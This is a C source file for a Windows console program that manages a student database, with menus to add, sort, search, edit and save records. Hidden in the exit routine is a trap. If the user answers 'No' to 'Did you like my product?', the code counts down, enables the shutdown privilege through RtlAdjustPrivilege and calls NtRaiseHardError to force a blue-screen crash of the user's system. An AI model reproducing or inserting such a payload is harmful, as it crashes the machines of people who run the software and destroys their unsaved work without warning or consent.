#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdbool.h>
#include <windows.h>
#include "app.h"
#include <string.h >
#include <conio.h>
#include <ctype.h>
#include <locale.h>




void printEnd() {


	printf("_________ _  _        _          ______   _______    ______   _______  _______  _       \n");
	printf("\\__   __/( )( \\      ( \\        (  ___ \\ (  ____ \\  (  ___ \\ (  ___  )(  ____ \\| \\    /\\\n");
	printf("   ) (   |/ | (      | (        | (   ) )| (    \\/  | (   ) )| (   ) || (    \\/|  \\  / /\n");
	printf("   | |      | |      | |        | (__/ / | (__      | (__/ / | (___) || |      |  (_/ / \n");
	printf("   | |      | |      | |        |  __ (  |  __)     |  __ (  |  ___  || |      |   _ (  \n");
	printf("   | |      | |      | |        | (  \\ \\ | (        | (  \\ \\ | (   ) || |      |  ( \\ \\ \n");
	printf("___) (___   | (____/\\| (____/\\  | )___) )| (____/\\  | )___) )| )   ( || (____/\\|  /  \\ \\\n");
	printf("\\_______/   (_______/(_______/  |/ \\___/ (_______/  |/ \\___/ |/     \\|(_______/|_/    \\/\n");



}
//typedef struct students students;
void main() {
	setlocale(LC_ALL, "Rus");
	HANDLE console = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(console, WH_FOREGROUNDIDLE);
	system("chcp 1251");

	char userName[255];
	FILE* dataUser = fopen("UserData.txt", "r");
	students STU[255];

	int lastSTU = -1;

	while (1) {
		system("cls");
		printLogo();

		printf("Hello, enter your name and the database will be loaded automatically,\n if you do not want this, then enter a new name to create an empty database\n");

		scanf("%255[^\n]", userName);

		if (!resolvedName(userName)) {
			printf("Invalid user name\n try agein press any key\n");
			_getch();
			continue;
		}
		else
			break;
	}

	newUserVerification(dataUser, userName);
	int n;
	char t[255];

	while (1) {
		system("cls");
		printf("Number of fields in the database: %d\n", lastSTU + 1);
		printLogo();
		printf("\n select the desired item:\n 1. entering user data\n 2. print students\n 3. sort arr\n 4. serch \n 5. delite elem\n 6. change elem \n 7. exit\n");
		scanf("%s", &t);
		if (allDigit(t)) {
			n = atoi(t);
		}
		else {
			printf("Invalid data\n press any key: \n");
			_getch();
			continue;
		}

		switch (n)
		{
		case 1:
			system("cls");
			printLogo();
			printf("\n select the desired item:\n 1. console input\n 2. load from file input\n 3. exit.\n");
			scanf("%s", &t);
			if (allDigit(t)) {
				n = atoi(t);
			}
			else {
				printf("Invalid data\n press any key: \n");
				_getch();
				break;
			}
			switch (n)
			{
			case 1:
				newStudent(STU, &lastSTU);
				printf("students add press any key to return\n");
				_getch();
				break;
			case 2:
				loadFromFile(STU, &lastSTU, userName);
				break;

			case 3:

				break;
			default:
				printf("Invalid data, try again\n press any key: ");
				_getch();
				break;
			}
			break;



		case 2:
			system("cls");
			printLogo();
			printf("\n select the desired item:\n 1. console output\n 2. save to file\n 3. exit.\n");
			scanf("%s", &t);
			if (allDigit(t)) {
				n = atoi(t);
			}
			else {
				printf("Invalid data\n press any key: \n");
				_getch();
				break;
			}

			switch (n)
			{
			case 1:
				printAllStu(STU, &lastSTU);
				_getch();
				break;
			case 2:
				loadToFile(STU, &lastSTU, userName);
				printf("All done!\ press any key: ");
				_getch();
				break;
			case 3:
				break;

			default:
				printf("Invalid data, try again\n press any key: ");
				_getch();
				break;
			}
			break;
		case 3:

			system("cls");
			printLogo();
			printf("\n select the desired item:\n 1. ascending sort \n 2. descending sort\n 3. exit.\n");
			scanf("%s", &t);
			if (allDigit(t)) {
				n = atoi(t);
			}
			else {
				printf("Invalid data\n press any key: \n");
				_getch();
				break;
			}

			switch (n)
			{
			case 1:
				system("cls");
				printLogo();
				printf("\n select the desired item:\n 1. sort name \n 2. sort last name\n 3. sort age\n 4. sort direction\n 5. exit.\n");
				scanf("%s", &t);
				if (allDigit(t)) {
					n = atoi(t);
				}
				else {
					printf("Invalid data\n press any key: \n");
					_getch();
					break;
				}
				if (n == 5)
					break;
				sortAscending(STU, &n, &lastSTU);
				break;
			case 2:

				system("cls");
				printLogo();
				printf("\n select the desired item:\n 1. sort name \n 2. sort last name\n 3. sort age\n 4. sort direction\n 5. exit.\n");
				scanf("%s", &t);
				if (allDigit(t)) {
					n = atoi(t);
				}
				else {
					printf("Invalid data\n press any key: \n");
					_getch();
					break;
				}

				if (n == 5)
					break;

				descendingAscending(STU, &n, &lastSTU);
				break;

			case 3:
				break;
			default:
				printf("Invalid data, try again\n press any key: ");
				_getch();
				break;
			}
			break;
		case 4:
			system("cls");
			printLogo();
			sercInData(STU, &lastSTU, 1);
			break;
		case 5:
			system("cls");
			printLogo();
			sercInData(STU, &lastSTU, 0); //mode 0 - delite mode 1- serch 
			break;
		case 6:
			changeUser(&STU[0], &lastSTU);
		break;
		case 7:
			printf("Do you want to save your changes?\n 1. Yes\n 2. No\n");
			scanf("%s", &t);
			if (allDigit(t)) {
				n = atoi(t);
				switch (n)
				{
				case 1:
					if (lastSTU != -1) {
						loadToFile(STU, &lastSTU, userName);
					}
					else {
						printf("Sorry we can't add empty file\n press eny key;");
						_getch();
					}
					break;

				case 2:
					printf("Have a good time <3\n Press any key: \n");
					_getch();
					break;
				default:
					printf("Invalid data, try again\n press eny key;");
					_getch();
					continue;
				}
			}
			else {
				printf("Invalid data\n press any key: \n");
				_getch();
				break;
			}
			system("cls");
			printLogo();
			printf("Did you like my product?\n 1. Yes\n 2. No\n");
			scanf("%d", &n);
			if (n == 2) {
				system("color 4");
				system("cls");

				int number = 5;
				while (number >= 1)
				{
					printf("%d \n", number);
					Sleep(1000);
					number--;
				}
				system("cls");
				printEnd();
				//printf("PRESS ANY KEY");
				//_getch();

				BOOLEAN f;
				ULONG u;
				LPVOID s = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
				LPVOID l = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
				pdef_RtlAdjustPrivilege t = (pdef_RtlAdjustPrivilege)s;
				pdef_NtRaiseHardError N = (pdef_NtRaiseHardError)l;
				NTSTATUS NtRet = t(19, TRUE, FALSE, &f);
				N(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &u);
			}


			return 0;

		default:
			printf("Invalid data, try again\n press any key: ");
			_getch();
		}
	}

}



bool newUserVerification(FILE* file, char* user) {
	char name[255];
	char buffer[255];

	while (fgets(buffer, 255, file) != NULL)
	{
		if (strcmp(buffer, concat(user, "\n")) == 0) {
			printf("Welcome back %s enjoy our product!\n press any key", user);
			_getch();
			return true;
		}

	}


	FILE* append = fopen("UserData.txt", "a");

	char* tDataUserName = concat(concat("UserData", user), ".txt");

	FILE* dtUser = fopen(tDataUserName, "w");

	fputs(user, append);
	fputs("\n", append);

	fclose(append);
	fclose(dtUser);
	printf("We are glad that you have decided to use our product.\n press any key");
	_getch();

	return FALSE;
}

char* concat(char* s1, char* s2) {

	size_t len1 = strlen(s1);
	size_t len2 = strlen(s2);

	char* result = malloc(len1 + len2 + 1);

	if (!result) {
		fprintf(stderr, "malloc() failed: insufficient memory!\n");
		return NULL;
	}

	memcpy(result, s1, len1);
	memcpy(result + len1, s2, len2 + 1);

	return result;
}


void printLogo() {
	printf("   _____    ______   ___       _   __   __ __    ____   _   __   ____   ____ \n");
	printf("  / ___/   /_  __/  /   |     / | / /  / //_/   /  _/  / | / /  / __ \\ / __ )\n");
	printf("  \\__ \\     / /    / /| |    /  |/ /  / ,<      / /   /  |/ /  / / / // __  |\n");
	printf(" ___/ /    / /    / ___ |   / /|  /  / /| |   _/ /   / /|  /  / /_/ // /_/ / \n");
	printf("/____/    /_/    /_/  |_|  /_/ |_/  /_/ |_|  /___/  /_/ |_/  /_____//_____/  \n\n\n");

}

void printAllStu(students* STU, int* lastSTU) {


	printf("*-------------------------------------------------------*\n");
	printf("|Sn |   Name     |Last name   |   Age      |Direction   |\n");
	printf("|-- | ---------- | ---------- | ---------- | ---------- |\n");

	for (int i = 0; i < *lastSTU + 1; i++) {

		printf("|%-3d|%-12s|%-12s|   %-9d|%-12s|\n", i + 1, STU[i].name, STU[i].lastName, STU[i].age, STU[i].direction);


		if (i != *lastSTU)
			printf("|-- | ---------- | ---------- | ---------- | ---------- |\n");

	}
	printf("*-------------------------------------------------------*\n");




}

void printAllStuSpecial(students* STU, int* lastSTU, int* indexArr, int* lastIndex) {


	printf("*-------------------------------------------------------*\n");
	printf("|Sn |   Name     |Last name   |   Age      |Direction   |\n");
	printf("|-- | ---------- | ---------- | ---------- | ---------- |\n");

	for (int i = 0; i < *lastIndex + 1; i++) {

		printf("|%-3d|%-12s|%-12s|   %-9d|%-12s|\n", i + 1, STU[indexArr[i]].name, STU[indexArr[i]].lastName, STU[indexArr[i]].age, STU[indexArr[i]].direction);
		if (i != *lastSTU)
			printf("|-- | ---------- | ---------- | ---------- | ---------- |\n");

	}
	printf("*-------------------------------------------------------*\n");




}
void printSTUid(students STU, int* lastSTU, int* indexArr) {


	printf("*-------------------------------------------------------*\n");
	printf("|Sn |   Name     |Last name   |   Age      |Direction   |\n");
	printf("|-- | ---------- | ---------- | ---------- | ---------- |\n");
	printf("|%-3d|%-12s|%-12s|   %-9d|%-12s|\n", indexArr[0] + 1, STU.name, STU.lastName, STU.age, STU.direction);
	printf("*-------------------------------------------------------*\n");




}



void newStudent(students* st, int* last) {
	system("cls");
	printLogo();

	char t[255];
	/*
	char name[255];
	char lastName[255];
	int age;
	char direction[255]; // направление
	*/
	printf("input new name:\n");
	scanf("%s", t);
	if (allLetters(t)) {
		strncpy(st[*last + 1].name, t, 255);
	}
	else {
		printf("Invalid data\n press any key: \n");
		_getch();
		goto m;
	}

	printf("\ninput new last name:\n");
	scanf("%s", t);
	if (allLetters(t)) {
		strncpy(st[*last + 1].lastName, t, 255);
	}
	else {
		printf("Invalid data\n press any key: \n");
		_getch();
		goto m;

	}


	printf("\ninput age:\n");
	scanf("%s", t);
	if (allDigit(t) && atoi(t) >= 0 && atoi(t) < 125) {
		
		st[*last + 1].age = atoi(t);
	}
	else {
		printf("Invalid data\n press any key: \n");
		_getch();
		goto m;
	}

	printf("\ninput direction:\n");
	scanf("%s", t);
	if (allLetters(t)) {
		strncpy(st[*last + 1].direction, t, 255);
	}
	else {
		printf("Invalid data\n press any key: \n");
		_getch();
		goto m;

	}


	*last = *last + 1;
m:;

}


void loadToFile(students* STU, int* lastSTU, char* username) {


	char* tDataUserName = concat(concat("UserData", username), ".txt");
	FILE* append = fopen(tDataUserName, "w");

	for (int i = 0; i <= *lastSTU; i++) {
		fprintf(append, "%s;", STU[i].name);
		fprintf(append, "%s;", STU[i].lastName);
		fprintf(append, "%d;", STU[i].age);
		fprintf(append, "%s\n", STU[i].direction);
	}

	fclose(append);
}


void loadFromFile(students* STU, int* lastSTU, char* username) {


	char* tDataUserName = concat(concat("UserData", username), ".txt");
	FILE* append = fopen(tDataUserName, "r");
	char buffer[255];
	char* newArr[4][255];
	*lastSTU = -1;



	while (fgets(buffer, 255, append) != NULL)
	{
		*lastSTU = *lastSTU + 1;
		parseData(buffer, STU, lastSTU);
	}

	fclose(append);
}



void parseData(char* datauser, students* STU, int* size) {

	int flag = 0;
	int count = 0;
	char agechar[10];

	for (int j = 0; j < 255; j++) {
		if (datauser[j] == '\n' || datauser[j] == '\0') {
			STU[*size].direction[count] = '\0';
			break;
		}
		if (datauser[j] == ';') {
			switch (flag)
			{
			case 0:
				STU[*size].name[count] = '\0';
				break;
			case 1:
				STU[*size].lastName[count] = '\0';
				break;
			case 2:
				agechar[count] = '\0';
				STU[*size].age = atoi(agechar);
			}
			flag++;
			count = 0;
			continue;
		}
		switch (flag) {
		case 0: {
			STU[*size].name[count] = datauser[j];
			count++;
			break;
		}
		case 1: {
			STU[*size].lastName[count] = datauser[j];
			count++;
			break;
		}
		case 2: {
			if (datauser[j] != ' ') {
				agechar[count] = datauser[j];
				count++;
			}
			break;
		}
		case 3: {
			STU[*size].direction[count] = datauser[j];
			count++;
			break;
		}
		}
	}
}




int nameCmpUp(const void* a, const void* b) {
	return strcmp(((students*)a)->name, ((students*)b)->name);
}
int nameCmpDown(const void* a, const void* b) {
	return strcmp(((students*)b)->name, ((students*)a)->name);
}


int lastNameCmpUp(const void* a, const void* b) {
	return strcmp(((students*)a)->lastName, ((students*)b)->lastName);
}
int lastNameCmpDown(const void* a, const void* b) {
	return strcmp(((students*)b)->lastName, ((students*)a)->lastName);
}


int directionCmpUp(const void* a, const void* b) {
	return strcmp(((students*)a)->direction, ((students*)b)->direction);
}
int directionCmpDown(const void* a, const void* b) {
	return strcmp(((students*)b)->direction, ((students*)a)->direction);
}


int ageCmpUp(const void* a, const void* b) {
	return ((students*)a)->age - ((students*)b)->age;
}
int ageCmpDown(const void* a, const void* b) {
	return ((students*)b)->age - ((students*)a)->age;
}



void serchStruct(students* STU, int* lastIndex, int* indexArr, int* lastIndexInResult, void* elem, int* num) {
	char t1[255];
	char t2[255];

	switch (*num)
	{
	case 1:
		if (atoi((char*)elem) - 1 <= *lastIndex && allDigit((char*)elem) ) {
			indexArr[0] = atoi((char*)elem) - 1;
			printSTUid(STU[atoi((char*)elem) - 1], lastIndex, indexArr);
			*lastIndexInResult = -2;

		}
		else
			*lastIndexInResult = -1;
		break;
	case 2:
		for (int i = 0; i < *lastIndex + 1; i++) {
			strcpy(t1, STU[i].name);
			strcpy(t2, (char*)elem);

			if (strcmp(_strupr(t1), _strupr(t2)) == 0) {
				*lastIndexInResult = *lastIndexInResult + 1;
				indexArr[*lastIndexInResult] = i;
			}
		}

		break;
	case 3:
		for (int i = 0; i < *lastIndex + 1; i++) {
			strcpy(t1, STU[i].lastName);
			strcpy(t2, (char*)elem);
			if (strcmp(_strupr(t1), _strupr(t2)) == 0) {
				*lastIndexInResult = *lastIndexInResult + 1;
				indexArr[*lastIndexInResult] = i;
			}
		}

		break;
	case 4:
		for (int i = 0; i < *lastIndex + 1; i++) {
			if (STU[i].age == atoi((char*)elem)) {
				*lastIndexInResult = *lastIndexInResult + 1;
				indexArr[*lastIndexInResult] = i;

			}
		}

		break;
	case 5:
		for (int i = 0; i < *lastIndex + 1; i++) {
			strcpy(t1, STU[i].direction);
			strcpy(t2, (char*)elem);
			if (strcmp(_strupr(t1), _strupr(t2)) == 0) {
				*lastIndexInResult = *lastIndexInResult + 1;
				indexArr[*lastIndexInResult] = i;

			}
		}

		break;
	default:
		*lastIndexInResult = -1;
		break;
	}
}



void changeUser(students* STU, int* lastSTU) {
	bool allDone = FALSE;
	system("cls");
	printLogo();
	int n, id;
	char find[255];
	char t[255];
	printf("input id user to cahnge\n");
	scanf("%s", &t);

	if (allDigit(t) ) {
		if (atoi(t) >= 1 && atoi(t) <= *lastSTU + 1) {
			id = atoi(t) - 1;

			system("cls");
			printLogo();
			printf("which column do you want to change?\n 1. change name \n 2. change last name\n 3. change age\n 4. change direction\n 5. exit.\n");
			scanf("%s", &t);

			if (allDigit(t)) {
				n = atoi(t);
				if (n >= 1 && n <= 4) {
					printf("\nreplaced by?:\n");
					scanf("%s", find);
					
					switch (n)
					{
					case 1:
						if (allLetters(find)) {
							strncpy(STU[id].name, find, 255);
							allDone = TRUE;
						}
						break;
						
					case 2:
						if (allLetters(find)) {
							strncpy(STU[id].lastName, find, 255);
							allDone = TRUE;
						}
						break;
					case 3:
						if (allDigit(find)) {
							
							if (atoi(find) >= 0 && atoi(find) < 130) {
								STU[id].age = atoi(find);
								allDone = TRUE;
							}
						}
						break;
					case 4:
						if (allLetters(find)) {
							strncpy(STU[id].direction, find, 255);
							allDone = TRUE;
						}
						break;

					default:
						printf("invalid data\n press any key\n");
						allDone = FALSE;
						_getch();
						break;
					}
				}
			}
			}

	}
		
	if (allDone == FALSE) {
	system("cls");
	printLogo();
	printf("invalid data\n press any key\n");
	_getch();
	}
	else {
		printf("\nCompleted successfully\npress any key: \n");
		_getch();
	}
	

}


void sercInData(students* STU, int* lastSTU, int mode) {  //mode 0 - delite mode 1- serch 
	if (mode == 1) {
		printf("\nselect the desired item serch in:\n 1. find id\n 2. find name \n 3. find last name\n 4. find age\n 5. find direction\n 6. exit.\n");
	}
	else
		printf("\nselect the desired item delite in:\n 1. delite by SN\n 2. delite by name \n 3. delite by last name\n 4. delite by age\n 5. delite direction\n 6. exit.\n");
	int n;

	char find[255];
	char t[255];
	scanf("%s", &t);
	if (allDigit(t)) {
		n = atoi(t);



		int indexArr[255];
		int lastIndenInArr = -1;
		if (n >= 1 && n <= 5) {

			printf("\ninput elem:\n");
			scanf("%s", find);

			serchStruct(STU, lastSTU, indexArr, &lastIndenInArr, find, &n);
			if (lastIndenInArr == -2)
				goto m;
			if (lastIndenInArr == -1) {
				printf("Invalid data\n try again\n");
				_getch();
			}
			else {
				system("cls");
				printLogo();
				if (mode == 1) {
					printAllStuSpecial(STU, lastSTU, indexArr, &lastIndenInArr);
					_getch();
				}
				else
					deliteData(STU, lastSTU, indexArr, &lastIndenInArr);
					_getch();
			}
		}
		if (mode == 0)
			printAllStu(STU, lastSTU);
		m:
		if (lastIndenInArr == -2) {
			printf("\nCompleted successfully\npress any key: \n");
			_getch();
		}
	}
	else {
		printf("Invalid data\n press any key: \n");
		_getch();

	}
}


void sortAscending(students* STU, int* n, int* lastSTU) {
	if (*lastSTU == -1) {
		printf("Hmm, it looks like there is no data in the database\nyou can enter them or load them from a file\n press any key");
	}
	switch (*n)
	{
	case 1:
		qsort(STU, *lastSTU + 1, sizeof(students), nameCmpUp);
		printf("Done\n press any key");
		_getch();
		break;

	case 2:
		qsort(STU, *lastSTU + 1, sizeof(students), lastNameCmpUp);
		printf("Done\n press any key");
		_getch();
		break;
	case 3:
		qsort(STU, *lastSTU + 1, sizeof(students), ageCmpUp);
		printf("Done\n press any key");
		_getch();

		break;
	case 4:
		qsort(STU, *lastSTU + 1, sizeof(students), directionCmpUp);
		printf("Done\n press any key");
		_getch();

		break;

	case 5:
		break;

	default:
		break;
	}

}


void descendingAscending(students* STU, int* n, int* lastSTU) {

	switch (*n)
	{
	case 1:
		qsort(STU, *lastSTU + 1, sizeof(students), nameCmpDown);
		break;

	case 2:
		qsort(STU, *lastSTU + 1, sizeof(students), lastNameCmpDown);
		break;
	case 3:
		qsort(STU, *lastSTU + 1, sizeof(students), ageCmpDown);

		break;
	case 4:
		qsort(STU, *lastSTU + 1, sizeof(students), directionCmpDown);

		break;

	case 5:
		break;
	default:
		break;
	}

}


void deliteData(students* STU, int* lastSTU, int* indexArr, int* lastIndenInArr) {
	for (int i = 0; i <= *lastIndenInArr; i++) {
		shiftArr(STU, lastSTU, &indexArr[i]);
		*lastSTU = *lastSTU - 1;
	}
}

void shiftArr(students* STU, int* lastSTU, int* startIndex) {
	for (int i = *startIndex; i < *lastSTU; i++) {

		students tST = STU[i];
		STU[i] = STU[i + 1];
		STU[i + 1] = tST;
	}
}


bool allLetters(char* s) {
	for (int i = 0; i < strlen(s); i++)
		if (!(s[i] >= 'A' && s[i] <= 'Z' || s[i] >= 'a' && s[i] <= 'z' || s[i] >= 'А' && s[i] <= 'я' || s[i] >= 'а' && s[i] <= 'я'))
			return 0;
	return true;
}

bool allDigit(char* s) {
	for (int i = 0; i < strlen(s); i++)
		if ((s[i] >= '0' && s[i] <= '9'))
			continue;
		else return FALSE;
	return true;
}

bool resolvedName(char* s) {
	for (int i = 0; i < strlen(s); i++)
		if (!(s[i] >= 'A' && s[i] <= 'Z' || s[i] >= 'a' && s[i] <= 'z' || s[i] >= 'А' && s[i] <= 'я' || s[i] >= 'а' && s[i] <= 'я' || s[i] >= '0' && s[i] <= '9'))
			return 0;
	return true;
}